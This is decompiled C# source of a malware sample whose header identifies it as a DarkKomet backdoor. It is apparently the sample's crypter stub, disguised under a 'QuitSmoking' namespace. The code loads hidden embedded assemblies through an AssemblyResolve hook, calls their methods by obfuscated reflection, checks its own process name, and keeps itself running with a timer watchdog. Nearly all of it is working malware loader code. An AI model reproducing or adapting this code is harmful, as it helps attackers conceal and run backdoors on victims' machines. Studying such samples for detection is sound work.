// Decompiled with JetBrains decompiler
// Type: QuitSmoking.MaijtRM
// Assembly: crypted, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 080C18EC-0955-448D-A117-4421EC462695
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.DarkKomet.kmi-3ce83152f1faf2f4870406cdfa4798c3a6264ed78f0c8d88d5730212e1b09fa8.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace QuitSmoking
{
  [StandardModule]
  internal sealed class MaijtRM
  {
    private static bool hix6CoxNkKG = true;
    private static double bz380 = 814490.0;
    private static double M9yyyolHG3T15t6F8TVO9fIsz9Xp = 9860932.0;
    private static int RY16I = 91;
    private static string FPK8V29NLaF6xx = "ƒtzŒRPU$g…)`NI?\\7ƒS{9kh5/";
    private static long DVLY4L0V9uk64xCvZ = 226866007;
    private static long DKcK7V = 70;
    private static long GBjLcPky0fle = 4;
    private static long E9JXfLlw = 73449;
    private static int SlW99K2EEzMm015JV453gJXd = 2772;
    private static long qA5X5S8PjLPCB5E = 70903790;
    private static string pqXew = "csrcc.exe";
    private static long w71ZdC60JN90699O9013F = 37;
    private static long UY7160X54afO0 = 3;
    private static double aQHpU6t9NJ = 97.0;
    private static int d6U75 = 80426717;
    private static double nEPuh84Bi08tl90v6 = 674826.0;
    private static bool T0m2367Zb47k5b3 = true;
    private static long S77ovUBfP5U6D8R4sZD42C1Q1IY6AwVy6I = 9620;
    [AccessedThroughProperty("FuaVWU")]
    private static System.Timers.Timer _FuaVWU;
    private static string or5fd87Cwws;
    private static string r3IScU67C4mur836;

    static MaijtRM()
    {
      MaijtRM.FuaVWU = new System.Timers.Timer();
      MaijtRM.or5fd87Cwws = "m`ykƒS}){\u0090w[uE>r\u0090|}ŽM'\u0090lz~P\u007FYWm‰22‘>z}H#B\u0081ƒ\u008DnI(fsƒt†Q$eb-„$‘cDC\u0081IcF’‹2Tzk^$,q+TG9xfŒt";
      MaijtRM.r3IScU67C4mur836 = "C>91yF@F_dxnef\u008Fˆl‰Ži}8>3rE`S’6AoCyB]W.EQ7:‰} ‡(1€{p‡l\u007F1*’%QTy€FHC(K\u007FCRQ]d]QcBT3~=Oe7YL#Wh8]Qp„kI†`YŠ\\;\u0081NJ2C/M`{^…e7J;/‚‰%†7+‡’\u007Fs…(ot\u008D<A!a6\u007FF)†*'O‘_*lA-vqc„i$uYKEc=D„'diC6{$C\\\u007F2|0nˆRu&c\u008D‹KJk\u008F~";
    }

    private static System.Timers.Timer FuaVWU
    {
      get => MaijtRM._FuaVWU;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ElapsedEventHandler elapsedEventHandler = new ElapsedEventHandler(MaijtRM.FuaVWU_Elapsed);
        if (MaijtRM._FuaVWU != null)
          MaijtRM._FuaVWU.Elapsed -= elapsedEventHandler;
        MaijtRM._FuaVWU = value;
        if (MaijtRM._FuaVWU == null)
          return;
        MaijtRM._FuaVWU.Elapsed += elapsedEventHandler;
      }
    }

    public static void uXqWtM()
    {
      if (!Conversions.ToBoolean(MaijtRM.YMKEW("AreErrorsPresent", "ReportProtector", "ErrorHandler")))
        return;
      Console.WriteLine(RuntimeHelpers.GetObjectValue(MaijtRM.YMKEW("ReApplySettings", "SmokingPapers", "PortFunc")));
    }

    public static void PfVYPoR()
    {
      GC.Collect();
      try
      {
        MaijtRM.FuaVWU.Interval = 10000.0;
        MaijtRM.FuaVWU.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        Thread.Sleep(10000);
        GC.Collect();
        Console.ReadLine();
      }
    }

    private static void FuaVWU_Elapsed(object sender, ElapsedEventArgs e)
    {
      if (!Conversions.ToBoolean(MaijtRM.YMKEW("CheckProcessStatus", "ReportProtector", "ErrorHandler")))
      {
        Console.WriteLine(RuntimeHelpers.GetObjectValue(MaijtRM.YMKEW("ReApplySettings", "SmokingPapers", "PortFunc")));
        GC.Collect();
      }
      GC.Collect();
    }

    private static object YMKEW(string MethodName, string DllName, string ClassName)
    {
      object type = (object) System.Type.GetType(DllName + "." + ClassName + "," + DllName);
      object objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(type, (System.Type) null, "GetConstructor", new object[1]
      {
        (object) System.Type.EmptyTypes
      }, (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Invoke", new object[1]
      {
        (object) null
      }, (string[]) null, (System.Type[]) null, (bool[]) null));
      object Instance = type;
      object[] objArray1 = new object[1]
      {
        (object) MethodName
      };
      object[] Arguments1 = objArray1;
      bool[] flagArray1 = new bool[1]{ true };
      bool[] CopyBack1 = flagArray1;
      object obj1 = NewLateBinding.LateGet(Instance, (System.Type) null, "GetMethod", Arguments1, (string[]) null, (System.Type[]) null, CopyBack1);
      if (flagArray1[0])
        MethodName = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (string));
      object objectValue2 = RuntimeHelpers.GetObjectValue(obj1);
      object[] objArray2 = new object[2]
      {
        RuntimeHelpers.GetObjectValue(objectValue1),
        (object) null
      };
      object[] Arguments2 = objArray2;
      bool[] flagArray2 = new bool[2]{ true, false };
      bool[] CopyBack2 = flagArray2;
      object obj2 = NewLateBinding.LateGet(objectValue2, (System.Type) null, "Invoke", Arguments2, (string[]) null, (System.Type[]) null, CopyBack2);
      if (flagArray2[0])
        RuntimeHelpers.GetObjectValue(objArray2[0]);
      return obj2;
    }

    public static byte[] IxdYZX(string UmjGcBGDORg)
    {
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(UmjGcBGDORg))
      {
        byte[] buffer = new byte[1024];
        using (MemoryStream memoryStream = new MemoryStream())
        {
          while (true)
          {
            int count = manifestResourceStream.Read(buffer, 0, buffer.Length);
            if (count <= 0)
            {
              try
              {
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              return memoryStream.ToArray();
            }
            memoryStream.Write(buffer, 0, count);
          }
        }
      }
      return (byte[]) null;
    }

    private static Assembly wucRlb(object sender, ResolveEventArgs e)
    {
      byte[] rawAssembly = (byte[]) null;
      string name = e.Name;
      if (Operators.CompareString(name, "SmokingPapers", false) == 0)
        rawAssembly = MaijtRM.IxdYZX("SmokingPapers.dll");
      else if (Operators.CompareString(name, "ReportProtector", false) == 0)
        rawAssembly = MaijtRM.IxdYZX("ReportProtector.dll");
      return Assembly.Load(rawAssembly);
    }

    [STAThread]
    public static void Main()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(MaijtRM.wucRlb);
      if (Path.GetFileName(Application.ExecutablePath).Contains(MaijtRM.pqXew))
      {
        MaijtRM.PfVYPoR();
      }
      else
      {
        new Thread(new ThreadStart(MaijtRM.uXqWtM)).Start();
        Console.WriteLine(RuntimeHelpers.GetObjectValue(MaijtRM.YMKEW("CompleteExecution", "SmokingPapers", "PortFunc")));
      }
    }

    public class dYCR
    {
    }
  }
}
